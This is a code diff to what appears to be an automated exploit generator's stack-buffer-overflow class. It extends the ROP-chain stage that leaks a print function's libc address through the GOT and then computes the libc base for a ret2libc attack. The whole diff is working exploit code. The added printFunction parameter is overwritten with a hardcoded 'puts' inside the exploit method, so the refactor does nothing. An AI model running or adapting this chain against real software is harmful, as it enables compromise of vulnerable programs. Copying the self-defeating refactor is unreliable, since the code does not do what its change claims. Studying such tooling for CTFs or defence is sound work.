@@ -26,7 +26,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
             functionExit,
             stackOffset,
             bufferFunction,
-            bufferSize : int = None):
+            bufferSize : int = None,
+            printFunction : str = "puts"):
         self.function = function
         self.binary = binary
         self.libc = libc
@@ -35,6 +36,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         self.functionExit = functionExit
         self.bufferFunction = bufferFunction
         self.bufferSize = bufferSize
+        self.printFunction = printFunction
     
     def __str__(self):
         fields = {
@@ -197,15 +199,16 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # Payload1: leak libc location
         prefixlen = abs(self.stackOffset)
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
-        sm.pop_rdi(self.binary.got["puts"], target='binary') # this REQUIRES puts to be present
-        print("XXXX", hex(self.binary.got["puts"]))
+        self.printFunction="puts"
+        sm.pop_rdi(self.binary.got[self.printFunction], target='binary') # this REQUIRES puts to be present
+        print("XXXX", hex(self.binary.got[self.printFunction]))
         # TODO: make puts a dependency
         # TODO: abstract out puts to any print
-        sm.ret("puts", 'binary')
+        sm.ret(self.printFunction, 'binary')
         sm.ret(function_addr, "binary")
       
         # we should be leaking 'puts' here but I'm being dumb. 
-        logger.info("Sending first payload (to leak 'puts' location)")
+        logger.info(f"Sending first payload (to leak '{self.printFunction}' location)")
        
         payload1 = sm.resolve(binary=0x0, libc=0x0)
         if self.bufferSize:
@@ -230,9 +233,9 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # since we're using puts anyhow, we know that it has been resolved.
         response = sconn.recvline()
         puts_location = response[:-1]
-        logger.debug(f"puts_location: {puts_location}")
+        logger.debug(f"{self.printFunction}_location: {puts_location}")
         puts_location = int.from_bytes(puts_location, byteorder='little')
-        libcoffset = puts_location - self.libc.symbols["puts"]
+        libcoffset = puts_location - self.libc.symbols[self.printFunction]
         logger.info("Libc found at {}".format(hex(libcoffset)))
 
         # need to navigate back to the targetFunc
